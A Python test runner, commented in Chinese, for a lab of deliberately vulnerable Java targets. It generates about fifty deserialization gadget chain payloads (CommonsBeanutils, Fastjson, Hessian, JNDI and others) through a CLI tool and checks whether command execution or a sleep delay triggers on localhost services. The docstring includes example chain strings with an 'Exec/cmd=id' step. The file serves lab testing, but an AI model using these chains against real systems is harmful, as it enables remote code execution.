#!/usr/bin/env python3
"""
Test Runner - Java 反序列化链靶机自动测试工具

基于 cli-chains.jar CLI 工具生成 payload，发送至靶机，验证漏洞是否可触发。

cli-chains.jar 参数格式（来自 -h 输出）:
    -p <PayloadType>          设置 payload 类型
    -s <GadgetA/GadgetB/...>  链字符串，参数内联，如 Exec/cmd=calc
    -g <Gadget> [-g <Gadget>] 逐个设置 gadget（与 -s 等价的拆分写法）
    -a <key=val>              单独设置参数（与内联 /key=val 等价）

示例:
    java -jar cli-chains.jar -p JavaNativePayload -s "CommonsBeanutils1/TemplatesImpl/Exec/cmd=id"
    java -jar cli-chains.jar -p Hessian2Payload   -s "SwingLazyValueUIDefaults/LazyValueWithDS/JavaNativeSerialization/CommonsBeanutils1/TemplatesImpl/Sleep/second=3"

Usage:
    python mcp-tools/test_runner.py --suite quick
    python mcp-tools/test_runner.py --suite full --report report.json
    python mcp-tools/test_runner.py --chain "CB1链" --mode rce
    python mcp-tools/test_runner.py --suite by_type --controller-type NATIVE
"""

import subprocess
import json
import time
import sys
import logging
import requests
import base64
import concurrent.futures
from pathlib import Path
from typing import Dict, List, Optional, Tuple
from dataclasses import dataclass, asdict, field

try:
    import yaml
    YAML_AVAILABLE = True
except ImportError:
    YAML_AVAILABLE = False

try:
    from _payloads import HARDCODED_PAYLOADS
except ImportError:
    HARDCODED_PAYLOADS: Dict[str, str] = {}

try:
    from _chain_data import _EMBEDDED_CHAIN_DATA
except ImportError:
    _EMBEDDED_CHAIN_DATA: List[Dict] = []

logging.basicConfig(
    level=logging.INFO,
    format="%(asctime)s [%(levelname)s] %(message)s",
    datefmt="%H:%M:%S",
)
log = logging.getLogger("test_runner")


# ─────────────────────────────────────────────
# 数据结构
# ─────────────────────────────────────────────

@dataclass
class TestResult:
    chain_name: str
    success: bool
    status: str = "UNKNOWN"          # SUCCESS / SLEEP_VERIFY / CONN_FAILED / GEN_FAILED / SKIPPED / ERROR
    error: Optional[str] = None
    payload_type: Optional[str] = None
    controller_type: str = "UNKNOWN"
    response_time_ms: Optional[int] = None
    exec_output: Optional[str] = None
    note: Optional[str] = None


# ─────────────────────────────────────────────
# 每条链的测试策略（完整 51 条）
# ─────────────────────────────────────────────

# 策略说明：
#   mode=rce    → 末尾节点是 Exec，替换为 Exec/cmd=<verify_cmd>
#   mode=sleep  → 末尾节点是 Sleep 或 Exec 可换成 Sleep
#   mode=as_is  → 链本身就是探测类，直接用原始 pipeline（反序列化炸弹/DNSLog探测类）
#   mode=jndi_native → 链内嵌 JNDI，把末尾 JNDI gadget 替换为 Sleep（需要 JNDI server 才能 RCE，sleep 是可靠的替代）
#   mode=spring_exec  → SpringExec，参数格式与 Exec 不同，需要 /cmd= 追加
#   mode=skip   → 无法自动化测试（FAKE_MYSQL / 特殊需求）

CHAIN_STRATEGY: Dict[str, str] = {
    # NATIVE (22条)
    "CB1链":                        "rce",
    "JDK17 RCE链":                   "rce",
    "JDK17 RCE链2":                  "rce",
    "CB1 JNDI链1":                   "jndi_native",   # 末尾 JdbcRowSetImpl，换成 Sleep
    "CB1 JNDI链2":                   "jndi_native",   # 末尾 LdapAttribute
    "CB2链":                         "rce",
    "K1链":                          "rce",
    "K1链二次反序列化1":              "rce",
    "K1链二次反序列化2":              "rce",
    "K2链":                          "rce",
    "K3链":                          "rce",
    "K4链":                          "rce",
    "Fastjson链":                    "sleep",          # 末尾已经是 Sleep
    "Fastjson JNDI链":               "jndi_native",   # 末尾 LdapAttribute
    "Fastjson C3p0 Jdbc h2链":       "rce",
    "Fastjson2链":                   "sleep",
    "Jackson链":                     "sleep",
    "Jackson C3p0 Jdbc h2链":        "rce",
    "反序列化炸弹":                   "as_is",          # FindClassByBomb，反序列化本身即触发
    "DNSLog探测类":                   "as_is",          # FindClass，同上
    "C3P0反序列化1":                  "jndi_native",   # 末尾 LdapClassLoader
    "C3P0反序列化2":                  "rce",
    # JNDI_BASIC (3条)
    "命令执行":                       "rce",
    "DNSLog探测链":                   "as_is",          # 末尾 DNSLogWithInfo，直接用（dnslog 模式才有效，sleep 无效）
    "Sleep探测链":                    "sleep",
    # HESSIAN (11条)
    "二次反序列化链":                  "rce",
    "JDK原生链1":                     "rce",
    "JDK原生链2（慎用）":             "skip",           # 可能导致 JVM 崩溃
    "JDK原生BCEL链":                  "rce",
    "JDK原生JNDI链":                  "jndi_native",   # 末尾 LazyValueWithJNDI
    "Spring JNDI链1":                "jndi_native",   # 末尾 SpringJndi1
    "Spring JNDI链2":                "jndi_native",
    "Spring 命令执行":                "spring_exec",   # 末尾 SpringExec
    "Xslt 代码执行":                  "rce",
    "Rome1低版本二次反序列化链":       "rce",
    "Rome2高版本二次反序列化链":       "rce",
    # INFO (4条)
    "JSP文件":                        "skip",
    "H2 Jdbc Url":                    "skip",
    "Spring Bean Xml 加载字节码":     "skip",
    "SpringBoot charsets.jar生成":    "skip",
    # JNDI_REF (6条)
    "经典 Tomcat EL 执行":            "rce",
    "Groovy 脚本执行":                "rce",
    "SnakeYaml 利用":                 "rce",
    "BeanshellRef 利用":              "rce",
    "HikariJdbcAttack Jdbc 利用":     "rce",
    "Druid Jdbc 利用":                "rce",           # 末尾 H2JavaExecJdbc1，本身执行命令
    # AMF (1条)
    "Axis2链":                        "rce",
    # HESSIAN_TOSTRING (3条)
    "Hessian XBean 链":               "rce",
    "Hessian Fastjson 链":            "rce",
    "Hessian Jackson 链":             "rce",
    # FAKE_MYSQL (1条)
    "ReadFile":                       "skip",
}


# ─────────────────────────────────────────────
# 控制器类型选择（内联自 vuln_env_generator）
# ─────────────────────────────────────────────

_CONTROLLER_TYPE_MAP: Dict[str, str] = {
    "Hessian2ToStringPayload": "HESSIAN_TOSTRING",
    "HessianPayload": "HESSIAN",
    "Hessian2Payload": "HESSIAN",
    "BlazeDSAMF3AMPayload": "AMF",
    "JNDIReferencePayload": "JNDI_REF",
    "JNDIRefBypassPayload": "JNDI_REF",
    "JNDIResourceRefPayload": "JNDI_REF",
    "JNDIBasicPayload": "JNDI_BASIC",
    "FakeMySQLReadPayload": "FAKE_MYSQL",
    "FakeMySQLPayload": "FAKE_MYSQL",
    "FakeMySQLSHPayload": "FAKE_MYSQL",
    "OtherPayload": "INFO",
}


def _pick_controller(chain_name: str, payload_types: List[str]) -> str:
    s = set(payload_types)
    name_lower = chain_name.lower()

    if "OtherPayload" in s and "jdbc" in name_lower and "JNDIResourceRefPayload" not in s and "JNDIReferencePayload" not in s:
        return "JDBC"
    for pt in ("Hessian2ToStringPayload", "Hessian2Payload", "HessianPayload",
               "BlazeDSAMF3AMPayload", "JNDIReferencePayload", "JNDIRefBypassPayload",
               "JNDIResourceRefPayload", "JNDIBasicPayload", "FakeMySQLReadPayload"):
        if pt in s:
            return _CONTROLLER_TYPE_MAP[pt]
    if "FakeMySQLPayload" in s or "FakeMySQLSHPayload" in s:
        return "FAKE_MYSQL"
    if "OtherPayload" in s:
        return "INFO"
    return "NATIVE"


# ─────────────────────────────────────────────
# 默认环境映射（链名 → 服务端口）
# ─────────────────────────────────────────────

DEFAULT_ENV_MAP: Dict[str, Dict] = {
    "Axis2链":                       {"service": "axis2", "port": 8081},
    "BeanshellRef 利用":              {"service": "beanshellref", "port": 8082},
    "C3P0反序列化1":                  {"service": "c3p01", "port": 8083},
    "C3P0反序列化2":                  {"service": "c3p02", "port": 8084},
    "CB1 JNDI链1":                   {"service": "cb1jndi1", "port": 8085},
    "CB1 JNDI链2":                   {"service": "cb1jndi2", "port": 8086},
    "CB1链":                         {"service": "cb1", "port": 8087},
    "CB2链":                         {"service": "cb2", "port": 8088},
    "DNSLog探测类":                   {"service": "dnslogclass", "port": 8089},
    "DNSLog探测链":                   {"service": "dnslogchain", "port": 8090},
    "Druid Jdbc 利用":               {"service": "druidjdbc", "port": 8091},
    "Fastjson2链":                   {"service": "fastjson2", "port": 8092},
    "Fastjson C3p0 Jdbc h2链":       {"service": "fastjsonc3p0h2", "port": 8093},
    "Fastjson JNDI链":               {"service": "fastjsonjndi", "port": 8094},
    "Fastjson链":                    {"service": "fastjson", "port": 8095},
    "Groovy 脚本执行":               {"service": "groovy", "port": 8096},
    "H2 Jdbc Url":                   {"service": "h2jdbcurl", "port": 8097},
    "Hessian Fastjson 链":           {"service": "hessianfastjson", "port": 8098},
    "Hessian Jackson 链":           {"service": "hessianjackson", "port": 8099},
    "Hessian XBean 链":              {"service": "hessianxbean", "port": 8100},
    "HikariJdbcAttack Jdbc 利用":   {"service": "hikarijdbc", "port": 8101},
    "Jackson C3p0 Jdbc h2链":       {"service": "jacksonc3p0h2", "port": 8102},
    "Jackson链":                     {"service": "jackson", "port": 8103},
    "JDK17 RCE链":                   {"service": "jdk17rce", "port": 8104},
    "JDK17 RCE链2":                  {"service": "jdk17rce2", "port": 8105},
    "JDK原生BCEL链":                  {"service": "jdkbcel", "port": 8106},
    "JDK原生JNDI链":                  {"service": "jdkjndi", "port": 8107},
    "JDK原生链1":                     {"service": "jdknative1", "port": 8108},
    "JDK原生链2（慎用）":             {"service": "jdknative2", "port": 8109},
    "JSP文件":                        {"service": "jspfile", "port": 8110},
    "K1链":                          {"service": "k1", "port": 8111},
    "K1链二次反序列化1":              {"service": "k1deser1", "port": 8112},
    "K1链二次反序列化2":              {"service": "k1deser2", "port": 8113},
    "K2链":                          {"service": "k2", "port": 8114},
    "K3链":                          {"service": "k3", "port": 8115},
    "K4链":                          {"service": "k4", "port": 8116},
    "ReadFile":                       {"service": "readfile", "port": 8117},
    "Rome1低版本二次反序列化链":       {"service": "rome1", "port": 8118},
    "Rome2高版本二次反序列化链":       {"service": "rome2", "port": 8119},
    "Sleep探测链":                    {"service": "sleepchain", "port": 8120},
    "SnakeYaml 利用":                {"service": "snakeyaml", "port": 8121},
    "SpringBoot charsets.jar生成":   {"service": "springbootcharsets", "port": 8122},
    "Spring Bean Xml 加载字节码":    {"service": "springbeanxml", "port": 8123},
    "Spring JNDI链1":               {"service": "springjndi1", "port": 8124},
    "Spring JNDI链2":               {"service": "springjndi2", "port": 8125},
    "Spring 命令执行":               {"service": "springexec", "port": 8126},
    "Xslt 代码执行":                  {"service": "xslt", "port": 8127},
    "二次反序列化链":                  {"service": "hessiandeser", "port": 8128},
    "反序列化炸弹":                    {"service": "deserbomb", "port": 8129},
    "命令执行":                        {"service": "cmdexec", "port": 8130},
    "经典 Tomcat EL 执行":            {"service": "tomcatel", "port": 8131},
}


# ─────────────────────────────────────────────
# Payload 生成器
# ─────────────────────────────────────────────

class PayloadGenerator:
    """
    封装 cli-chains.jar 的调用。

    cli-chains.jar -s 格式：GadgetA/GadgetB/.../param=value
      - gadget 名和参数都用 / 分隔，内联在同一字符串里
      - 参数格式：key=value，跟在对应 gadget 之后
      - 示例：CommonsBeanutils1/TemplatesImpl/Exec/cmd=id
      - 示例：SwingLazyValueUIDefaults/.../Sleep/second=3
    """

    def __init__(self, cli_jar_path: str, verify_cmd: str = "echo chain_ok"):
        self.cli_jar = Path(cli_jar_path)
        self.verify_cmd = verify_cmd
        self._summary_cache: Optional[Dict] = None

    def _load_summary(self) -> Dict:
        if self._summary_cache is None:
            p = Path("gadget-dependencies/gadget_chains_summary.json")
            if p.exists():
                with open(p, encoding="utf-8") as f:
                    self._summary_cache = json.load(f)
            elif _EMBEDDED_CHAIN_DATA:
                self._summary_cache = {"chains": _EMBEDDED_CHAIN_DATA}
            else:
                self._summary_cache = {}
        return self._summary_cache

    def get_chain_config(self, chain_name: str) -> Optional[Dict]:
        for c in self._load_summary().get("chains", []):
            if c["name"] == chain_name:
                return c
        return None

    def get_supported_chains(self) -> List[str]:
        return [c["name"] for c in self._load_summary().get("chains", [])]

    # ------------------------------------------------------------------
    # 核心：构建 -s 字符串
    # ------------------------------------------------------------------

    def _build_s_string(self, chain_name: str, pipeline: List[str]) -> Optional[str]:
        """
        根据链策略构建 cli-chains.jar 的 -s 参数字符串。

        返回 None 表示应该 SKIP。
        """
        strategy = CHAIN_STRATEGY.get(chain_name, "rce")

        if strategy == "skip":
            return None

        if strategy == "rce":
            # 末尾节点是 Exec，替换成 Exec/cmd=<verify_cmd>
            parts = list(pipeline)
            if parts and parts[-1] == "Exec":
                parts[-1] = f"Exec/cmd={self.verify_cmd}"
            elif parts and parts[-1] != "Exec":
                # 末尾不是 Exec 但策略是 rce（如 H2JavaExecJdbc1 / SpringExec）
                # 保持原样，这类节点本身就会执行命令
                pass
            return "/".join(parts)

        if strategy == "sleep":
            # 末尾节点是 Sleep 或 Exec，统一换成 Sleep/second=3
            parts = list(pipeline)
            if parts and parts[-1] in ("Exec", "Sleep"):
                parts[-1] = "Sleep/second=3"
            elif parts:
                # 其他末尾节点（如 DNSLogWithInfo），追加 Sleep
                parts.append("Sleep/second=3")
            return "/".join(parts)

        if strategy == "as_is":
            # 探测类或 DNSLog 链，直接用原始 pipeline
            return "/".join(pipeline)

        if strategy == "jndi_native":
            # 链末尾是 JNDI gadget（JdbcRowSetImpl/LdapAttribute/LdapClassLoader/
            # LazyValueWithJNDI/SpringJndi1），需要真实 JNDI server 才能触发 RCE。
            # 测试策略：截断到前一个节点，追加 Sleep/second=3 验证链路可达性。
            parts = list(pipeline)
            JNDI_TAIL_NODES = {
                "JdbcRowSetImpl", "LdapAttribute", "LdapClassLoader",
                "LazyValueWithJNDI", "SpringJndi1",
            }
            # 去掉末尾的 JNDI gadget，换成 Sleep
            while parts and parts[-1] in JNDI_TAIL_NODES:
                parts.pop()
            if not parts:
                return None  # pipeline 只有 JNDI gadget，无法截断
            parts.append("Sleep/second=3")
            return "/".join(parts)

        if strategy == "spring_exec":
            # SpringExec 末尾节点，内置命令执行能力，保持原样
            return "/".join(pipeline)

        return "/".join(pipeline)

    def _get_payload_type(self, chain_name: str, payload_types: List[str]) -> str:
        """根据链名和 payload_types 选择最合适的 payload 类型。"""
        # 优先级规则（与 vuln_env_generator._pick_controller 一致）
        s = set(payload_types)
        name_lower = chain_name.lower()

        if ("OtherPayload" in s and "jdbc" in name_lower
                and "JNDIResourceRefPayload" not in s
                and "JNDIReferencePayload" not in s):
            return "OtherPayload"
        if "Hessian2ToStringPayload" in s:
            return "Hessian2ToStringPayload"
        if "HessianPayload" in s or "Hessian2Payload" in s:
            return "Hessian2Payload"
        if "BlazeDSAMF3AMPayload" in s:
            return "BlazeDSAMF3AMPayload"
        if "JNDIReferencePayload" in s:
            return "JNDIReferencePayload"
        if "JNDIResourceRefPayload" in s:
            return "JNDIResourceRefPayload"
        if "JNDIBasicPayload" in s:
            return "JNDIBasicPayload"
        if "FakeMySQLReadPayload" in s:
            return "FakeMySQLReadPayload"
        if "OtherPayload" in s:
            return "OtherPayload"
        return "JavaNativePayload"

    def generate(self, chain_name: str) -> Tuple[Optional[bytes], str, str, str]:
        """
        生成 payload。优先使用硬编码 payload，其次调用 cli-chains.jar。

        Returns:
            (raw_bytes_or_None, payload_type, strategy, s_string)
            raw_bytes=None 表示 SKIP 或失败
        """
        strategy = CHAIN_STRATEGY.get(chain_name, "rce")
        if strategy == "skip":
            return None, "", "skip", ""

        # 优先使用硬编码 payload
        if chain_name in HARDCODED_PAYLOADS:
            raw = base64.b64decode(HARDCODED_PAYLOADS[chain_name])
            cfg = self.get_chain_config(chain_name)
            p_type = self._get_payload_type(chain_name, cfg["payload_types"]) if cfg else "JavaNativePayload"
            log.debug("Using hardcoded payload for %s", chain_name)
            return raw, p_type, strategy, "(hardcoded)"

        # 回退到 cli-chains.jar
        cfg = self.get_chain_config(chain_name)
        if not cfg:
            return None, "", "error", ""

        pipeline     = cfg["pipeline"]
        payload_types = cfg["payload_types"]

        s_str = self._build_s_string(chain_name, pipeline)
        if s_str is None:
            return None, "", "skip", ""

        p_type = self._get_payload_type(chain_name, payload_types)

        if not self.cli_jar.exists():
            raise FileNotFoundError(f"cli-chains.jar not found: {self.cli_jar}")

        cmd = ["java", "-jar", str(self.cli_jar), "-p", p_type, "-s", s_str]
        log.debug("cmd: %s", " ".join(cmd))

        try:
            result = subprocess.run(
                cmd, capture_output=True, timeout=30
            )
        except subprocess.TimeoutExpired:
            raise RuntimeError("cli-chains.jar timed out (30s)")

        if result.returncode != 0:
            err = result.stderr.decode("utf-8", errors="replace").strip()
            raise RuntimeError(f"cli-chains.jar exit {result.returncode}: {err}")

        return result.stdout, p_type, strategy, s_str


# ─────────────────────────────────────────────
# 测试执行器
# ─────────────────────────────────────────────

class TestRunner:
    """
    并发测试执行器（支持独立运行，无需 cli-chains.jar）。

    Payload 来源优先级：
      1. _payloads.py 中的硬编码 payload（base64）
      2. cli-chains.jar 动态生成

    完整测试流程（每条链）：
      1. 生成/获取 payload
      2. Base64 编码后 POST 到 Gateway /api/trigger
      3. 根据策略验证结果：
         - rce/spring_exec/as_is  → 靶机 /api/exec?cmd=... 验证命令输出
         - sleep/jndi_native      → 校验响应时间 >= 3000ms
         - as_is（探测类）        → 靶机可达即成功
    """

    def __init__(self, config_path: str = "mcp-tools/test_config.yaml"):
        self.cfg = self._load_config(config_path)

        # cli-chains.jar 路径
        pg_cfg        = self.cfg.get("payload_generator", {})
        cli_jar       = pg_cfg.get("cli_jars_path", "cli-chains/cli-chains.jar")
        verify_cmd    = self.cfg.get("verify_cmd", "echo chain_ok")

        self.gen      = PayloadGenerator(cli_jar, verify_cmd)
        self.verify_cmd = verify_cmd

        # Gateway
        gw_cfg          = self.cfg.get("gateway", {})
        self.gateway_url = gw_cfg.get("url", "http://localhost:8080").rstrip("/")
        self.timeout     = gw_cfg.get("timeout", 30)

        # 手动跳过列表（来自配置文件）
        chains_cfg        = self.cfg.get("chains", {})
        self.skip_extra   = set(chains_cfg.get("skip", []))

        self.results: Dict[str, TestResult] = {}

    @staticmethod
    def _load_config(path: str) -> Dict:
        if not YAML_AVAILABLE:
            return {}
        p = Path(path)
        if p.exists():
            with open(p, encoding="utf-8") as f:
                return yaml.safe_load(f) or {}
        return {}

    # ------------------------------------------------------------------
    # 单链测试
    # ------------------------------------------------------------------

    def test_single_chain(self, chain_name: str) -> TestResult:
        strategy = CHAIN_STRATEGY.get(chain_name, "rce")

        # SKIP 检查
        if strategy == "skip" or chain_name in self.skip_extra:
            r = TestResult(
                chain_name=chain_name,
                success=False,
                status="SKIPPED",
                controller_type=self._ctrl(chain_name),
                note=("Manually configured to skip"
                      if chain_name in self.skip_extra
                      else "No automated test path for this chain type"),
            )
            self.results[chain_name] = r
            return r

        # Step 1: 生成 payload
        try:
            raw, p_type, actual_strategy, s_str = self.gen.generate(chain_name)
        except Exception as e:
            r = TestResult(
                chain_name=chain_name,
                success=False,
                status="GEN_FAILED",
                error=str(e),
                controller_type=self._ctrl(chain_name),
            )
            self.results[chain_name] = r
            return r

        if raw is None:
            r = TestResult(
                chain_name=chain_name,
                success=False,
                status="SKIPPED",
                controller_type=self._ctrl(chain_name),
                note="SKIP returned from generator",
            )
            self.results[chain_name] = r
            return r

        payload_b64 = base64.b64encode(raw).decode()

        # Step 2: 发送到 Gateway
        trigger_url = f"{self.gateway_url}/api/trigger"
        start = time.time()
        try:
            resp = requests.post(
                trigger_url,
                json={"chain": chain_name, "payload": payload_b64},
                timeout=self.timeout,
            )
            elapsed_ms = int((time.time() - start) * 1000)
            try:
                resp_data = resp.json()
            except Exception:
                resp_data = {}
        except requests.exceptions.ConnectionError:
            r = TestResult(
                chain_name=chain_name,
                success=False,
                status="CONN_FAILED",
                error=f"Cannot reach {trigger_url}",
                payload_type=p_type,
                controller_type=self._ctrl(chain_name),
            )
            self.results[chain_name] = r
            return r
        except Exception as e:
            r = TestResult(
                chain_name=chain_name,
                success=False,
                status="ERROR",
                error=str(e),
                payload_type=p_type,
                controller_type=self._ctrl(chain_name),
            )
            self.results[chain_name] = r
            return r

        # Step 3: 验证
        r = TestResult(
            chain_name=chain_name,
            success=False,
            payload_type=p_type,
            controller_type=self._ctrl(chain_name),
            response_time_ms=elapsed_ms,
        )

        if actual_strategy in ("sleep", "jndi_native"):
            # Sleep 验证：响应时间 >= 3000ms
            ok = elapsed_ms >= 3000
            r.success = ok
            r.status  = "SUCCESS" if ok else "SLEEP_TIMEOUT"
            r.note    = f"elapsed={elapsed_ms}ms (need >=3000ms)"

        elif actual_strategy in ("rce", "spring_exec"):
            # RCE 验证：调用靶机 /api/exec?cmd=<verify_cmd>
            ok, output = self._verify_exec(chain_name)
            r.success     = ok
            r.status      = "SUCCESS" if ok else "RCE_FAILED"
            r.exec_output = output

        elif actual_strategy == "as_is":
            # 探测类：靶机返回 2xx 即认为链路可达（反序列化点存在）
            ok = (200 <= resp.status_code < 300)
            r.success = ok
            r.status  = "SUCCESS" if ok else "HTTP_ERROR"
            r.note    = f"HTTP {resp.status_code}"

        else:
            r.status = "UNKNOWN_STRATEGY"

        self.results[chain_name] = r
        return r

    def _verify_exec(self, chain_name: str) -> Tuple[bool, str]:
        """GET /api/exec/{chainName}?cmd=<verify_cmd> 验证命令执行。"""
        try:
            import urllib.parse
            cmd_enc = urllib.parse.quote(self.verify_cmd)
            # Gateway API 路径: /api/exec/{chainName}?cmd=...
            url = f"{self.gateway_url}/api/exec/{urllib.parse.quote(chain_name)}?cmd={cmd_enc}"
            resp = requests.get(url, timeout=10)
            if resp.status_code == 200:
                data = resp.json()
                # Gateway 返回格式: {"chain": "...", "cmd": "...", "result": "...", "timestamp": ...}
                # 其中 result 字段包含靶机的原始 JSON 响应
                result_raw = data.get("result", "")
                if result_raw:
                    # result 是 JSON 字符串，需要解析
                    try:
                        import json
                        result_obj = json.loads(result_raw)
                        stdout = result_obj.get("stdout", "")
                        return bool(stdout.strip()), stdout.strip()
                    except:
                        # 如果不是 JSON，直接使用
                        return bool(result_raw.strip()), result_raw.strip()
                return False, "No result in response"
            return False, f"HTTP {resp.status_code}"
        except Exception as e:
            return False, str(e)

    def _ctrl(self, chain_name: str) -> str:
        """获取链的控制器类型（用于报告分组）。"""
        cfg = self.gen.get_chain_config(chain_name)
        if not cfg:
            # 硬编码 payload 也能推断类型
            if chain_name in HARDCODED_PAYLOADS:
                return "NATIVE"
            return "UNKNOWN"
        return _pick_controller(chain_name, cfg["payload_types"])

    # ------------------------------------------------------------------
    # 批量测试
    # ------------------------------------------------------------------

    def test_all(self, parallel: int = 5) -> Dict[str, TestResult]:
        chains = self.gen.get_supported_chains()
        log.info("Testing %d chains (parallel=%d)", len(chains), parallel)

        with concurrent.futures.ThreadPoolExecutor(max_workers=parallel) as exe:
            futures = {exe.submit(self.test_single_chain, c): c for c in chains}
            for fut in concurrent.futures.as_completed(futures):
                try:
                    r = fut.result()
                    icon = "✓" if r.success else ("⊘" if r.status == "SKIPPED" else "✗")
                    detail = r.note or r.exec_output or r.error or r.status
                    log.info("%s %-40s  %s", icon, r.chain_name, detail)
                except Exception as e:
                    log.error("Unexpected error: %s", e)

        return self.results

    def test_by_type(self, ctrl_type: str, parallel: int = 3) -> Dict[str, TestResult]:
        chains = [
            c for c in self.gen.get_supported_chains()
            if self._ctrl(c) == ctrl_type
        ]
        log.info("Testing %d chains of type %s", len(chains), ctrl_type)
        with concurrent.futures.ThreadPoolExecutor(max_workers=parallel) as exe:
            futures = {exe.submit(self.test_single_chain, c): c for c in chains}
            for fut in concurrent.futures.as_completed(futures):
                r = fut.result()
                icon = "✓" if r.success else ("⊘" if r.status == "SKIPPED" else "✗")
                log.info("%s %s  %s", icon, r.chain_name, r.note or r.error or r.status)
        return self.results

    # ------------------------------------------------------------------
    # 报告
    # ------------------------------------------------------------------

    def print_summary(self):
        total   = len(self.results)
        success = sum(1 for r in self.results.values() if r.success)
        skipped = sum(1 for r in self.results.values() if r.status == "SKIPPED")
        failed  = total - success - skipped

        print(f"\n{'='*62}")
        print(f"  MCP Test Runner — Summary")
        print(f"{'='*62}")
        print(f"  Total   : {total}")
        print(f"  Success : {success}  ({success/total*100:.1f}% of total)" if total else "  Success : 0")
        print(f"  Failed  : {failed}")
        print(f"  Skipped : {skipped}")
        print(f"{'─'*62}")

        # 按控制器类型统计
        stats: Dict[str, Dict] = {}
        for r in self.results.values():
            c = r.controller_type
            stats.setdefault(c, {"ok": 0, "fail": 0, "skip": 0})
            if r.success:          stats[c]["ok"]   += 1
            elif r.status == "SKIPPED": stats[c]["skip"] += 1
            else:                  stats[c]["fail"] += 1

        print("  By controller type:")
        for ctype in sorted(stats):
            s = stats[ctype]
            t = s["ok"] + s["fail"] + s["skip"]
            rate = s["ok"] / (s["ok"] + s["fail"]) * 100 if (s["ok"] + s["fail"]) > 0 else 0
            print(f"    {ctype:<18} {s['ok']:>2}/{s['ok']+s['fail']:>2} passed  ({rate:.0f}%)  skip={s['skip']}")

        # 失败详情
        failed_list = [r for r in self.results.values()
                       if not r.success and r.status != "SKIPPED"]
        if failed_list:
            print(f"{'─'*62}")
            print("  Failed chains:")
            for r in failed_list:
                print(f"    ✗ [{r.status}] {r.chain_name}: {r.error or r.note or ''}")
        print(f"{'='*62}\n")

    def save_json_report(self, path: str):
        report = {
            "timestamp": time.strftime("%Y-%m-%d %H:%M:%S"),
            "summary": {
                "total":   len(self.results),
                "success": sum(1 for r in self.results.values() if r.success),
                "failed":  sum(1 for r in self.results.values()
                               if not r.success and r.status != "SKIPPED"),
                "skipped": sum(1 for r in self.results.values() if r.status == "SKIPPED"),
            },
            "results": {n: asdict(r) for n, r in self.results.items()},
        }
        Path(path).parent.mkdir(parents=True, exist_ok=True)
        with open(path, "w", encoding="utf-8") as f:
            json.dump(report, f, indent=2, ensure_ascii=False)
        log.info("Report saved: %s", path)


# ─────────────────────────────────────────────
# 入口
# ─────────────────────────────────────────────

def main():
    import argparse
    ap = argparse.ArgumentParser(description="MCP Test Runner")
    ap.add_argument("--config", "-c", default="mcp-tools/test_config.yaml")
    ap.add_argument("--chain",        help="Test a single chain by name")
    ap.add_argument("--suite",        choices=["quick", "full", "by_type"], default="quick")
    ap.add_argument("--controller-type", "-t",
                    choices=["NATIVE","HESSIAN","HESSIAN_TOSTRING","AMF",
                             "JNDI_REF","JNDI_BASIC","JDBC","INFO","FAKE_MYSQL"])
    ap.add_argument("--parallel", "-p", type=int, default=5)
    ap.add_argument("--report",   "-r", help="Save JSON report to file")
    ap.add_argument("--debug",    action="store_true")
    args = ap.parse_args()

    if args.debug:
        logging.getLogger().setLevel(logging.DEBUG)

    runner = TestRunner(args.config)

    if args.chain:
        r = runner.test_single_chain(args.chain)
        print(json.dumps(asdict(r), indent=2, ensure_ascii=False))
    elif args.suite == "by_type":
        if not args.controller_type:
            ap.error("--controller-type required for by_type suite")
        runner.test_by_type(args.controller_type, args.parallel)
        runner.print_summary()
    elif args.suite in ("quick", "full"):
        runner.test_all(args.parallel)
        runner.print_summary()
    else:
        ap.print_help()

    if args.report:
        runner.save_json_report(args.report)


if __name__ == "__main__":
    main()
